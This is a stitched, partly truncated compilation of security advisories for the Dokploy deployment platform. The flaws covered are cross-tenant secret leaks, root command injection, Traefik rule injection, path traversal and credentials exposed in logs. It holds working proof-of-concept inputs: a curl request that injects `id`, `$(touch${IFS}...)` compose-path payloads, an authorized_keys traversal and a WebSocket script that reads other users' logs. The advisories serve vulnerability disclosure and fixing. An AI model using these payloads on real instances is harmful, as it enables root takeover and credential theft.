[poc.py](https://github.com/user-attachments/files/28923031/poc.py) (Python 3, standard library only) reproduces the full attack against an instance you own. It bootstraps or signs in as the owner,...

Cross-organization Git-provider secret disclosure (IDOR) via {github,gitlab,bitbucket,gitea}.one tRPC handlers
advisories.summary:
## Summary
The Git-provider tRPC routers (`github.ts`, `gitlab.ts`, `bitbucket.ts`, `gitea.ts`) each expose a `one` query (and `getRepositories`/`getBranches`/`testConnection`) that loads a provider by a bare ID through `protectedProcedure`, which performs authentication ONLY and does NOT enforce organization scoping. The handler returns the full provider row including secrets: GitHub App private key, client secret, webhook secret; GitLab/Gitea OAuth secret + access/refresh tokens; Bitbucket API token.

Any authenticated user - including one who self-registers and creates their own organization (`organization.create` is `protectedProcedure`, available to every authenticated user, making the caller an owner) - can pass another organization's provider ID and read that organization's Git-provider credentials. This crosses the tenant trust boundary and yields the secrets needed to clone/modify the victim org's source repositories (e.g. minting GitHub App installation tokens from the leaked private key).

This is a missed sibling of CVE-2026-43917 (GHSA-f8wj-5c4w-frhg, "Cross-Organization IDOR: Multiple tRPC endpoints missing activeOrganizationId validation"). That advisory enumerated deployment/rollbacks/backup/volume-backups/cluster/mount and recommended adding `organizationId !== activeOrganizationId` validation after every `find*ById()` call. The four Git-provider `one` handlers were not covered and remain unscoped at the latest release.

## Affected (verified at latest, v0.29.8, commit 1f4f94042f1d874349c42d8ae7fee51346cd086e)
- `apps/dokploy/server/api/routers/github.ts:25` `one` -> `findGithubById(input.githubId)` (no org check). Leaks `githubPrivateKey`, `githubClientSecret`, `githubWebhookSecret`, `githubInstallationId` (schema `packages/server/src/db/schema/github.ts:13-18`).
- `apps/dokploy/server/api/routers/gitlab.ts:54` `one` -> `findGitlabById` leaks `secret`, `accessToken`, `refreshToken`.
- `apps/dokploy/server/api/routers/bitbucket.ts:52` `one` -> `findBitbucketById` leaks `apiToken`.
- `apps/dokploy/server/api/routers/gitea.ts:56` `one` -> `findGiteaById` leaks `clientSecret`, `accessToken`, `refreshToken`.

## Root cause
`protectedProcedure` (`apps/dokploy/server/api/trpc.ts:161-173`) only checks `ctx.session`/`ctx.user`; it never validates that an input resource ID belongs to `ctx.session.activeOrganizationId`. Each handler must enforce the org boundary manually. The list handler in each router (`githubProviders` etc.) DOES filter `provider.gitProvider.organizationId === ctx.session.activeOrganizationId` and strips secret fields - proving the pattern is known - but the `one` handlers omit it and return the raw secret-bearing row.

## Checked-vs-unchecked sibling (github)
VULNERABLE (github.ts:25-27):
```ts
one: protectedProcedure.input(apiFindOneGithub).query(async ({ input }) => {
  return await findGithubById(input.githubId);   // bare id, NO org check, raw row w/ secrets
}),
```
CORRECT SIBLING (github.ts:47-63):
```ts
result = result.filter((provider) =>
  provider.gitProvider.organizationId === ctx.session.activeOrganizationId &&
  accessibleIds.has(provider.gitProvider.gitProviderId));
// ...then returns only { githubId, gitProvider } (no secret fields)
```

## Attack scenario
1. Attacker registers and creates org A via `organization.create` (becomes owner).
2. Attacker obtains org B's `githubId` (nanoid; visible in shared-deployment UIs/build logs or enumerable).
3. `github.one({ githubId: "<org-B-id>" })` returns org B's `githubPrivateKey` + `githubClientSecret` + `githubWebhookSecret`.
4. Attacker mints GitHub App installation tokens -> clones/modifies org B's private repos -> supply-chain compromise of org B's deployments.

## Impact
Cross-tenant disclosure of Git-provider credentials enabling access to the victim org's source code. CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N (7.7 High).

## Fix
After each `find*ById(id)` in the `one`/`getRepositories`/`getBranches`/`testConnection` handlers, veri...

Authenticated OS command injection in Dokploy leads to root remote code execution (systemic; multiple endpoints)
advisories.summary:
## Summary

Dokploy's server engine builds shell command strings by **directly interpolating user-controlled fields into
template literals** and then executes them through a shell - `execAsync(cmd)` runs `/bin/sh -c "<cmd>"` on the
Dokploy control-plane host, and `execAsyncRemote(serverId, cmd)` runs the string via SSH on a managed server whose
SSH user is typically **root** (`packages/server/src/utils/process/execAsync.ts`). Roughly 336 call sites use these
shell sinks; only a handful of fields (`appName`, `branch`, `databasePassword`) are character-restricted, while the
rest are free `z.string()`. As a result, many authenticated API operations allow OS command injection that executes
**as root**.

This was confirmed live with **two** PoCs: (1) a single `destination.testConnection` tRPC call injected `id` and
produced `uid=0(root)` on the Dokploy host (owner/admin-gated); (2) a **base-tier organization member** - verified
UNAUTHORIZED on the `destination` vector - injected `id` via `volumeBackups.restoreVolumeBackupWithLogs` and likewise
obtained `uid=0(root)` on the host. The member-reachable path makes this a privilege-escalation-to-root.

## Severity

- **CVSS v3.1: 9.9 (Critical)** - `AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H` - for the member-reachable variants: a
  low-privilege organization member with access to a single service obtains root on the Dokploy host / managed
  servers (scope change: the control-plane host governs every organization and connected server).
- The endpoint proven live (`destination.testConnection`) is gated by `destination:create` (owner/admin or a
  member/custom-role granted it); even there the issue is High-Critical, especially in Dokploy Cloud / multi-tenant
  deployments and via the `execAsyncRemote` (root-on-managed-server) path.

## Sink model

`packages/server/src/utils/process/execAsync.ts`:

```ts
const execAsyncBase = util.promisify(exec);
export const execAsync = (command, options?) => execAsyncBase(command, options);            // /bin/sh -c on host
export const execAsyncRemote = (serverId, command) => { /* ssh2 */ conn.exec(command, ...) }; // remote shell (root)
```

`execFileAsync` (argument-array, no shell) is the safe variant but is used only 3 times.

## Live-proven vector - `destination.testConnection` → root RCE on the Dokploy host

- **Sink** - `apps/dokploy/server/api/routers/destination.ts:60-91`:
  ```ts
  const rcloneFlags = [`--s3-access-key-id="${accessKey}"`, `--s3-secret-access-key="${secretAccessKey}"`,
                       `--s3-region="${region}"`, `--s3-endpoint="${endpoint}"`, ...];
  const rcloneCommand = `rclone ls ${rcloneFlags.join(" ")} ":s3:${bucket}"`;
  if (IS_CLOUD) await execAsyncRemote(input.serverId || "", rcloneCommand);   // root on managed server
  else          await execAsync(rcloneCommand);                              // Dokploy host
  ```
- **Entry / auth** - `destinationRouter.testConnection`, `withPermission("destination","create")`. Executes
  immediately (no deploy, no persisted side effect).
- **Validation** - `apiCreateDestination` (`packages/server/src/db/schema/destination.ts:43-71`): `accessKey`,
  `secretAccessKey`, `region`, `endpoint`, `bucket`, `provider` are all plain `z.string()` (only `additionalFlags`
  is regex-filtered). A `"` in `accessKey` closes the quoted flag; the remainder is interpreted by the shell.

### Reproduction (official image `dokploy/dokploy`, reports v0.29.8)

1. Run Dokploy with Postgres + Redis. Register the first user (becomes owner) via better-auth:
   `POST /api/auth/sign-up/email` `{email,password,name}`; keep the `better-auth.session_token` cookie.
2. Call the mutation with an injecting `accessKey`:
   ```bash
   curl -b cookies.txt -X POST http://HOST:3000/api/trpc/destination.testConnection \
     -H 'Content-Type: application/json' \
     --data '{"json":{"name":"poc","provider":"","accessKey":"x\"; id > /tmp/pwned 2>&1; echo \"",...

advisories.title: Authenticated Server-Side Request Forgery in Dokploy via the AI provider `getModels` endpoint
advisories.summary:
## Summary

The `ai.getModels` tRPC query accepts a fully user-controlled `apiUrl` (`z.string().min(1)`, with no URL or host

advisories.title: Traefik rule injection via unsanitized host and path fields - cross-tenant traffic hijack
advisories.summary:
### Summary

Any authenticated Dokploy user can inject arbitrary Traefik router rules by setting their application domain's `host` or `path` to a value containing backtick or pipe characters. Because Traefik routing rules are applied globally, the injected rule can match traffic destined for **other users' applications** on the same Dokploy instance, enabling cross-tenant traffic interception.

### Details

**File:** `packages/server/src/utils/traefik/domain.ts`

**Vector A - `host` field via `toPunycode()` catch fallback (line ~84, ~92):**

```typescript
const toPunycode = (host: string): string => {
    try {
        return new URL(`http://${host}`).hostname;
    } catch {
        return host;   // ← unsanitized original returned on parse error
    }
};

// line ~92
rule: `Host(\`${punycodeHost}\`)${
  path !== null && path !== "/"
    ? ` && PathPrefix(\`${path}\`)`
    : ""
}`,
```

The backtick character (`\``) is a WHATWG "forbidden domain code point," so `new URL("http://evil\`host")` throws a `TypeError`. The `catch` block returns the **raw, unmodified `host` string** - including the injected backtick. That string is then interpolated directly into the Traefik router rule.

**Vector B - `path` field, zero sanitization (line ~92):**

The `path` field is interpolated with no validation:
```typescript
` && PathPrefix(\`${path}\`)`
```

**Validation in `packages/server/src/db/validations/domain.ts`:**

```typescript
host: z.string().min(1).refine(val => val === val.trim(), ...),
path: z.string().min(1).optional(),
```

Only `min(1)` and trim-check. No character allowlist. Backticks, pipes, and parentheses all pass validation and reach the Traefik config.

### PoC

1. Log in to Dokploy as any user with at least one application.
2. Navigate to your application → Domains → Add Domain.
3. Set Host to:
   ```
   victim.example.com`) || Host(`admin.internal
   ```
4. Save and deploy.
5. Dokploy writes this Traefik router rule to the config file:
   ```
   Host(`victim.example.com`) || Host(`admin.internal`)
   ```
6. Traefik reloads and begins routing all `admin.internal` traffic to the attacker's container.

**Path vector (simpler):**
Set Host = `victim.example.com`, Path = `` /app`) || Host(`internal.service ``
Result: `` Host(`victim.example.com`) && PathPrefix(`/app`) || Host(`internal.service`) ``

**Expected:** Domain fields with special characters are rejected at validation.
**Actual:** The injected string is written into the Traefik YAML config file and takes effect on next Traefik reload.

### Impact

- Any authenticated Dokploy user can intercept and read HTTPS/HTTP traffic intended for other applications on the same instance.
- Enables theft of session tokens, API keys, and any data passing through the shared Traefik proxy.
- In single-user self-hosted deployments: self-harm only. In multi-user/team deployments: full cross-tenant traffic hijack.

### Recommended Fix

Add a character allowlist to the `host` and `path` fields in `packages/server/src/db/validations/domain.ts`:

```typescript
host: z.string().min(1)
  .regex(/^[a-zA-Z0-9.\-*]+$/, "Invalid domain characters")
  .refine(val => val === val.trim(), ...),

path: z.string().min(1)
  .regex(/^[a-zA-Z0-9\/\-._~!$&'()*+,;=:@%]+$/, "Invalid path characters")
  .optional(),
```

Alternatively, remove the `catch` fallback in `toPunycode()` - reject domains that fail WHATWG URL parsing instead of passing them through.

**Disclosure method:** Static code review of `main` branch (v0.29.8), confirmed 2026-07-05. Not dynamically tested.

advisories.title: Authenticated Remote Code Execution and Host Escape via Command Injection in Dokploy Domain Management ServiceName Field
Remote deployment failures expose environment secrets in Dokploy container logs
advisories.summary:
## Summary

Dokploy logs the complete remote deployment command when remote command execution fails. Environment variables are embedded directly into that command, so sensitive values are written unredacted to the Dokploy service container logs.

This was observed on July 17, 2026 during a raw Docker Swarm Stack deployment to a remote server. The remote command failed before deployment because the SSH user could not create `/etc/dokploy`. Dokploy then logged an `ExecError` object containing its complete `command` property. The command contained production authentication tokens, application signing secrets, API credentials, and provider credentials. No real credential values are included in this report.

## Affected version

Dokploy v0.29.12, which was the latest release when observed.

## Configuration

- Dokploy running as a Docker Swarm service
- Remote server connected over SSH
- Application deployed as a raw Docker Stack
- Environment variables configured through Dokploy

## Steps to reproduce

1. Add a remote server to Dokploy.
2. Configure a raw Stack with `EXAMPLE_SECRET=confidential-value`.
3. Cause the remote deployment command to exit non-zero. For example, use a remote SSH account that cannot create `/etc/dokploy/logs`.
4. Start the deployment.
5. Run `docker service logs dokploy`.
6. Locate the resulting `ExecError`.

## Actual behavior

The service log contains an entry structurally equivalent to:

```text
Error [ExecError]: Remote command failed with exit code 1
    at ignore-listed frames {
  command: '\n' +
    'mkdir -p /etc/dokploy/logs/example;\n' +
    'env -i PATH="$PATH" HOME="$HOME" ' +
    'EXAMPLE_SECRET=confidential-value ' +
    'docker stack deploy ...',
  stdout: '',
  stderr: 'mkdir: cannot create directory ... Permission denied',
  exitCode: 1,
  serverId: '<redacted>'
}
```

The complete secret value is retained in the Dokploy container log. In the observed incident, the generated command contained multiple real production credentials.

## Expected behavior

Dokploy must not write environment-variable values or other sensitive command contents to application logs.

## Security impact

Anyone able to read the Dokploy service logs, Docker JSON logs, or a downstream log collector can recover application credentials from failed deployments. The exposed credentials can belong to services outside Dokploy, including registries, databases, infrastructure providers, and third-party APIs. Secrets may remain in local and archived logs after deployment configuration is changed.

## Suggested remediation

1. Omit the complete remote command from the log-safe representation of execution errors.
2. Keep command details separate from serialized/logged exception objects.
3. Redact environment assignments before logging as defense in depth.
4. Audit other local and remote command-execution error paths.
5. Add tests proving sentinel secret values never appear in logs after deployment failures.
6. Consider advising affected users to rotate credentials exposed by failed deployment logs.

## Workaround

Restrict access to Dokploy and Docker logs, avoid forwarding them to broadly accessible collectors, and rotate credentials following failed deployments.

## Disclosure notes

No original logs or real credentials are attached. The affected operator has been advised to rotate exposed credentials.

### Summary

A shell command injection vulnerability exists in Dokploy's patch repository handling functionality.

An authenticated user with access to an application or Docker Compose service can control the `repoPath` parameter used by the `readRepoDirectories` API endpoint. This value is later concatenated into a shell command and executed through local or remote command execution functions.

The vulnerability affects Dokploy v0.29.11 (commit: 1c4414165d4aedbf6e28afab7a94c8fb7c053373).

The issue may allow an authenticated attacker to execute arbitrary shell commands on the Dokploy host or configured remote server under the privileges of the corresponding Dokploy execution context.

CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')

The vulnerable data flow consists of three stages: Source, Processing, and Sink.


### Source

The `repoPath` parameter is controlled by the client through the patch repository workflow.

Affected frontend components:

    apps/dokploy/components/dashboard/application/patches/show-patches.tsx

    apps/dokploy/components/dashboard/application/patches/patch-editor.tsx


The frontend sends the value through:

    api.patch.readRepoDirectories.useQuery({
        id,
        type,
        repoPath
    })

The backend endpoint is implemented in:

    apps/dokploy/server/api/routers/patch.ts


The `readRepoDirectories` procedure accepts `repoPath` directly from the client request:

    readRepoDirectories(input.repoPath, serverId)

Local execution:

    child_process.exec(command, ...)


Remote execution:

    conn.exec(command, ...)

advisories.summary: ### Summary Dokploy 0.29.13 allows any authenticated member user to call `settings.getWebServerSettings` and receive the global web-server settings object. That object includes the stored `sshPrivateKey` value. The write endpoint for the same key is admin-only, but the read endpoint is only authenticated-user protected. In my proof, an owner stores an SSH private key through the normal admin-only mutation. A default member user cannot overwrite that key, but the same member user can read it back through `settings.getWebServerSettings`. ### Details The access-control boundary is inconsistent: - `settings.saveSSHPrivateKey` is an `adminProcedure`. - `settings.getWebServerSettings` is a `protectedProcedure`. - The returned settings object includes the `sshPrivateKey` field. Relevant source locations in Dokploy 0.29.13: - `apps/dokploy/server/api/routers/settings.ts:87`: `getWebServerSettings` is registered as `protectedProcedure`. - `apps/dokploy/server/api/routers/settings.ts:91`: the full settings object is returned. - `apps/dokploy/server/api/routers/settings.ts:303`: `saveSSHPrivateKey` is registered as `adminProcedure`. - `packages/server/src/db/schema/web-server-settings.ts:26`: `sshPrivateKey` is stored in the web-server settings table. advisories.summary:
### Summary

Dokploy 0.29.13 Drop deployments extract attacker-supplied ZIP entries under an application code directory, but the path validation only checks that the resolved path remains under Dokploy's global base path.

As a result, a member user assigned to one application can upload a ZIP entry such as:

```text
../../../traefik/dynamic/member-drop-hijack.yml

## Summary

`redactRcloneCredentials()` - added in #4648 and shipped in **v0.29.9** - never fires on the backup path it was written for. The S3 **access key** and **secret access key** are still written in plaintext to `docker service logs dokploy` on **every backup run**, on the current release (**v0.29.13**).

The cause is a format mismatch between the code that *builds* the rclone command and the code that *redacts* it.

## Details

**The builder** - `packages/server/src/utils/backups/utils.ts` - quotes values with the `shell-quote` library:

```js
`--s3-access-key-id=${quote([accessKey])}`
`--s3-secret-access-key=${quote([secretAccessKey])}`
```

**The redactor** - `packages/server/src/utils/backups/redact.ts` - matches only **double-quoted** values:

```js
/(--s3-access-key-id=)"[^"]*"/g
/(--s3-secret-access-key=)"[^"]*"/g
```

**`shell-quote`'s `quote()` never emits double quotes.** It returns safe values bare, and uses *single* quotes or backslash escapes when escaping is required:

| input | `quote([value])` output |
| --- | --- |
| `AKIAIOSF••••••••••••` | `AKIAIOSF••••••••••••` (bare) |
| `wJalrXUtnFEMIK7MDENGbPxRfiCYEXAMPLEKEY` | bare |
| `abc+def/ghi=` | `abc+def/ghi\=` |
| `has space` | `'has space'` (single quotes) |

Because the producer never emits the double-quoted form the regex requires, the redaction cannot match - for **any** credential value. The credentials then reach the application logger here:

```js
logger.info({ rcloneCommand: redactRcloneCredentials(rcloneCommand), ... })  // "Executing backup command"
```

### Why CI does not catch it

`apps/dokploy/__test__/backups/redact-credentials.test.ts` asserts against hand-written, already-double-quoted strings, e.g.

```js
'rclone rcat --s3-access-key-id="AKIAIOSF••••••••••••" --s3-secret-access-key="wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"'
```

The test never exercises the output of `getS3Credentials()`, so it passes while the production path leaks. A test driven through the real builder would fail immediately.

## PoC

1. Configure an S3 backup destination and a compose/postgres backup schedule.
2. Trigger the backup.
3. On the host:

```bash
# quoted form (what the redactor matches)  -> 0
docker service logs dokploy --since 10m 2>&1 | grep -c -- '--s3-secret-access-key="'
# unquoted form (what is actually emitted) -> 1
docker service logs dokploy --since 10m 2>&1 | grep -cE -- '--s3-secret-access-key=[^"]'
# evidence of redaction                    -> 0
docker service logs dokploy --since 10m 2>&1 | grep -c 'REDACTED'
```

The `Executing backup command` INFO line contains `rcloneCommand:` with both credentials in plaintext.

Observed on **v0.29.13** (latest at time of writing), Ubuntu 24.04, single-manager Swarm, compose-postgres backup to an S3-compatible endpoint.

## Impact

**CWE-532 - insertion of sensitive information into log file.** Long-lived object-storage credentials for the backup destination are written to container logs on every backup run.

Severity is **low**: reading these logs requires privileged host access (docker/root), and such an actor can already read the same credentials from Dokploy's database, so the incremental access is small. The practical risk is **propagation and persistence** - container logs are routinely shipped to aggregators whose read access is far broader than host root, and with Docker's default `json-file` driver and no rotation policy they persist indefinitely. Credentials leaked this way also survive a rotation of the underlying secret only until the next backup run re-logs the new one, which makes remediation awkward for operators.

## Suggested fix

1. **Make the patterns quote-agnostic** - accept bare, single-quoted and double-quoted values:
   `(--s3-(?:access-key-id|secret-access-key)=)("[^"]*"|'[^']*'|\S+)`
2. **Better - redact before quoting.** Construct the redacted string from the *unquoted* inputs rather than regex-ing t...

advisories.summary:
### Summary
An authenticated platform user (default role = "member") on Dokploy v0.29.13 and v0.29.14 can call the tRPC mutation `mounts.create` with `type=file` and a `filePath` parameter containing `../` sequences. The value is concatenated via `path.join()` with the application files base directory then written to disk as UID 0 root with no path normalization, boundary checks, or schema regex. Because `/etc/dokploy/` inside the dokploy container is a Docker **bind mount** from the actual operator host, writes into the container's `/etc/dokploy/` subtree propagate to the operator's real host filesystem as root-owned files. A single HTTP request therefore lets a regular tenant user overwrite host SSH keys, host cron files, or Dokploy's host .env secrets. Combined with the pre-existing '/var/run/docker.sock' bind inside dokploy container, this trivially escalates to full host root shell on the physical machine.

### Details
The Affected Component : `createFileMount()` in packages/server/src/services/mount.ts lines 81-106

The function reads the mount row from postgres (attacker writes the filePath via the tRPC mutation body), obtains the base application files directory at `/etc/dokploy/applications/<APP_NAME>/files/`, then writes attacker-controlled content:

```typescript
  packages/server/src/services/mount.ts : 

  if (serverId) {
      const command = getCreateFileCommand(baseFilePath, mount.filePath, mount.content);
      await execAsyncRemote(serverId, command);
  } else {
      await createFile(baseFilePath,       // /etc/dokploy/applications/X/files/
                                   mount.filePath,     // <- Triggered with  "../../../poc.txt"
                                   mount.content);     // <- Triggered with arbitrary bytes
  }
```

`createFile()` in packages/server/src/utils/docker/utils.ts does:
  1.  `fullPath = path.join(baseFilePath, mount.filePath)`       -> no `..` strip
  2.  `fs.mkdir(path.dirname(fullPath), { recursive: true })`    -> mkdir -p as root
  3.  `fs.writeFile(fullPath, content, { mode: 0o644 })`         -> write owned root:root

Ladder of traversals for a standard install:
  baseFilePath:           /etc/dokploy/applications/<name>/files/
 1st level :  × ../   ->  /etc/dokploy/applications/<name>/
  2nd level : ../../   ->  /etc/dokploy/applications/
  3rd level : ../../../   ->  /etc/dokploy/
  4th level : ../../../../   ->  /etc/
  6th level : ../../../../../../   ->  /root/.ssh/  (authorized_keys write possible)
  7th level : ../../../../../../../   ->  /root/.ssh/authorized_keys   ->  attacker payload / Embedded ssh key

Root cause on the schema layer is that no regex on `filePath`. Compare against the filtered sibling fields in db/schema/utils.ts lines 39-50:
```typescript
  export const APP_NAME_REGEX     = /^[a-zA-Z0-9._-]+$/;            
  export const VOLUME_NAME_REGEX  = /^[a-zA-Z0-9][a-zA-Z0-9_.-]*$/; 
  export const DATABASE_PASSWORD_REGEX = /^[a-zA-Z0-9@#...]*$/;     

  // vs. mount.ts createSchema - no regex :
  //   filePath: z.string().optional(),       ->  accepts ../../../../
  //   content:  z.string().optional(),      -> arbitrary bytes, no max size cap

Requirements :
  - Dokploy v0.29.13
  - Web UI: http://127.0.0.1:3000

  - Existing application id

BASE=http://127.0.0.1:3000
COOK=./cookies-admin.txt
APP_ID=a6JpFJYUdp5GkIo1hvOVe
curl -s -X POST "$BASE/api/trpc/mounts.create" \

OS command injection via libsql appName missing APP_NAME_REGEX validation
advisories.summary:
## Summary
The libsql database service is the only database type whose `appName` field is not validated by `APP_NAME_REGEX`. `appName` flows unquoted into `docker service`/`docker ps` shell commands executed via `execAsync`/`execAsyncRemote`, allowing OS command injection on the Dokploy host.

## Root Cause
`apiCreateLibsql` types `appName` as `z.string().min(1)` (apps/dokploy/server/api/routers/libsql.ts:118) - every other database (postgres/mysql/mariadb/mongo/redis) applies `.regex(APP_NAME_REGEX)` (added to all DBs except libsql by commit `960892fd8`). The value is passed through `cleanAppName` (schema/utils.ts:66 = `.trim().replace(/ /g,"-").toLowerCase()`), which does NOT strip `$ ( ) ; | \``. It then reaches `getServiceContainerCommand` - `docker ps ... --filter "...service.name=${appName}"` (double-quoted → `$(...)` fires) - and unquoted `docker service` commands.

## Impact
Command execution on the Dokploy control-plane host (Docker socket → app→host escape) or a managed remote server = RCE.

## Proof of Concept
As a member with `canCreateServices` (else admin/owner), create a libsql service with `appName` containing a `$(...)` payload (see payload note below), then trigger a service/backup operation that runs the appName-bearing docker command.

## Attack Chain
1. Entry: tRPC `libsql.create` (`checkServiceAccess "create"`) - routers/libsql.ts:53. Guard: `apiCreateLibsql` schema. Bypass proof: `appName: z.string().min(1)` (libsql.ts:118) - the lone DB missing `.regex(APP_NAME_REGEX)`.
2. Normalization: `buildAppName` → `cleanAppName`. Guard: `cleanAppName`. Bypass proof: it only trims/space-replaces/lowercases; does not strip `$ ( ) ;` (confirmed schema/utils.ts:66).
3. Sink: `getServiceContainerCommand` `docker ps ... --filter "...service.name=${appName}"` (double-quoted) and unquoted `docker service scale ${appName}` → `execAsync`/`execAsyncRemote` (shell). Guard: none. Bypass proof: `$(...)` fires inside double quotes.
4. Impact: RCE on host/remote server.

## Bypass Evidence
`cleanAppName` confirmed to leave metacharacters intact. `$(...)` executes inside double quotes (verified `bash -c 'echo "x$(id -u)"'`). No advisory covers libsql `appName` (CVE-2026-72862/72878 libsql references target `dockerImage`/`database`, not `appName`). Missing regex confirmed on the v0.29.14 release tag. **Payload note:** `${IFS}` does NOT work here because `cleanAppName` lowercases (IFS→ifs); use a literal TAB/newline for word-splitting or a no-argument command such as `$(reboot)`/`$(id)`.

## Affected Versions
`<= 0.29.14` (libsql `appName` lacks the regex on the release tag and at HEAD).

## Suggested Fix
Add `.regex(APP_NAME_REGEX)` to the libsql `appName` schema for parity with the other database types.

---
Reported by **zx (Jace)** - GitHub: @manus-use

advisories.summary:
### Summary

The v0.29.13 fix for CVE-2026-72865 (GHSA-8r5w-vqjr-8c44) correctly quoted `docker compose -f ${path}` in `builders/compose.ts` and `services/compose.ts`, but missed two sinks in `utils/docker/domain.ts` fed by the same user-controlled `composePath`:

- `writeDomainsToCompose` (domain.ts:130): `echo "<b64>" | base64 -d > "${path}";` - runs on every deploy of a compose that rewrites its file. Command substitution `$(...)` and backticks execute inside the double-quoted redirect target.
- `loadDockerComposeRemote` (domain.ts:88): `cat ${path}` - completely unquoted, executed over SSH on the remote server.

A member with write+deploy rights on one compose service puts a payload in the **Compose Path** field in the UI and deploys.

### Details

- `composePath`: `z.string().min(1)` only (`packages/server/src/db/schema/compose.ts:188`), no regex.
- `getComposePath` (domain.ts:49-61) uses `path.join`, which does not neutralize shell metacharacters.
- Contrast: `createCommand` (builders/compose.ts:132-134) quotes the same value correctly - one field, escaped in one place, missed in two others.

### PoC

All steps through the UI, verified on a live v0.30.0 instance (attacker = member with one compose service):

1. Compose service -> General -> Git provider: set **Compose Path** = `./docker-compose.yml$(touch${IFS}PWNED_VULN02_MARKER)`, repo URL/branch to a repo the attacker controls:

![composePath payload in form](https://storage.googleapis.com/dokploy-poc-evidence/dokploy-0.30.0/vuln02-01-composepath-payload-in-form.jpeg)

2. Save -> "Git Provider Saved":

![git provider saved](https://storage.googleapis.com/dokploy-poc-evidence/dokploy-0.30.0/vuln02-02-git-provider-saved.jpeg)

3. Commit a file literally named `docker-compose.yml$(touch${IFS}PWNED_VULN02_MARKER)` to the repo root (git permits `$()`, `{}`, `${IFS}` in filenames). The file must exist so `loadDockerCompose` can parse it.
4. Deploy -> Confirm. The rewrite step executes `base64 -d > "${path}"` with the payload path; the `$(touch ...)` substitution runs as root. The deploy still succeeds, and the deployment log shows the injected command:

![deploy log with injection](https://storage.googleapis.com/dokploy-poc-evidence/dokploy-0.30.0/vuln02-03-deploy-log-injection-visible.jpeg)

Result verified via `docker exec` from the host (SSH):

```
$ docker exec <dokploy-container> sh -c 'ls -la /app/PWNED_VULN02_MARKER; id'
-rw-r--r-- 1 root root 0 Aug 14 21:23 /app/PWNED_VULN02_MARKER
uid=0(root) gid=0(root) groups=0(root)
```

The marker timestamp matches the deployment at 21:23:45 exactly.

### Impact

Member -> root RCE in the control-plane (Docker socket = host compromise, same containment assumption accepted for CVE-2026-72865 scored 9.9 Critical). With a remote `serverId`, sink 2 runs the payload directly in the remote host's SSH shell, bypassing any container boundary. A `composePath` containing `../` additionally allows path traversal on the file write.

### Affected versions

All through v0.30.0. The 0.29.13 patch left these two sinks unquoted.

### Remediation

Validate composePath as a relative path confined to the build dir (no `..`, no shell metacharacters, regex like APP_NAME_REGEX). Quote domain.ts:88 and :130 with shell-quote or use file APIs. Add regression tests with filenames containing `$(...)`, backtick, `${IFS}`.

CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H - CWE-78.

/listen-deployment WebSocket has no service permission check - any member streams deployment logs of every service, including projects they have zero access to
advisories.summary:
### Summary

The `/listen-deployment?logPath=...` WebSocket only verifies the session is valid (plus the org of serverId for remote servers). It never checks the relationship between `logPath` and the caller's granted services. Any organization member streams (`tail -f`) deployment logs of every service, including services in projects they cannot even open in the UI. Build logs routinely echo environment variables, secrets, and connection strings.

### Details

`apps/dokploy/server/wss/listen-deployment.ts`:

- Line 34: `validateRequest(req)` - identity only.
- Line 44: `readValidDirectory(logPath, serverId)` - blocks traversal outside `/etc/dokploy` (charset whitelist plus resolved prefix) but does not gate on accessedServices.
- Lines 49-52: session check runs after path validation (wrong order - an unauthenticated client gets a path-validity oracle through close code 4000 vs no code).
- Lines 58-64: org check applies to a remote serverId only; local services (the majority) get no further check.
- Execution: `spawn("tail", ["-n", "+1", "-f", logPath])` (line 127, local) or an SSH tail for remote.

The logPath follows the standard format `/etc/dokploy/logs/<appName>/<appName>-<timestamp>.log`. The appName leaks through several sources: container names, monitoring, service listings when visible.

### PoC

Verified on a live v0.30.0 instance. Attacker: member with NO access to the victim project (project absent from accessedProjects, environment absent from accessedEnvironments, service absent from accessedServices - the UI refuses to open the service page):

```js
const ws = new WebSocket(
  `wss://<host>/listen-deployment?logPath=/etc/dokploy/logs/<appName>/<appName>-<timestamp>.log`
);
ws.binaryType = "arraybuffer";
ws.onmessage = (e) => console.log(typeof e.data === "string" ? e.data : new TextDecoder().decode(e.data));
```

No command needs to be sent - the server starts `tail -n +1 -f` on connect and pushes the whole file.

Output the attacker received while reading the log of a real production application they have zero access to:

![deployment log leak](https://storage.googleapis.com/dokploy-poc-evidence/dokploy-0.30.0/image-1.png)

### Impact

Any member reads deployment logs of every service in the organization: build output that frequently echoes environment variables and secrets, internal image names, runtime errors carrying data. Combined with the terminal advisory, the v0.30.0 WebSocket layer lacks consistent service scoping for both terminals and logs.

### Affected versions

All through v0.30.0.

### Remediation

Extract the appName from logPath (the directory component directly under LOGS_PATH), resolve the owning service, and call checkServiceAccess(ctx, serviceId, "read") - or at minimum verify the service is in accessedServices. Authenticate before validating or reading the path. Consider rate limiting and audit logging for WebSocket connections.

CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:L/A:N (6.8 Medium) - CWE-862.

advisories.summary:
### Summary

**This is not a new vulnerability and I am not claiming it as one.** GHSA-7r6p-v9gw-pwc8 already names `apps/dokploy/server/wss/listen-deployment.ts` in its "Vulnerable handlers" list. apps/dokploy/server/wss/terminal.ts                  |  6 ++

if (!(await canAccessDockerOverWss(user, session, serverId, serviceId))) {
